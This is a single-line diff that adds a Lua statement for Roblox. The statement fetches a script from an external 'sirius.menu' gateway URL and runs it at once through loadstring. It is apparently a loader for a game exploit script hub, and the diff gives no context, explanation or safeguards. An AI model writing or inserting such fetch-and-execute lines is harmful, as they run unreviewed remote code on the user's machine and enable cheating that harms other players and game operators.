@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://gate.sirius.menu/gateway?id=sid_f669me7o85ao'))()
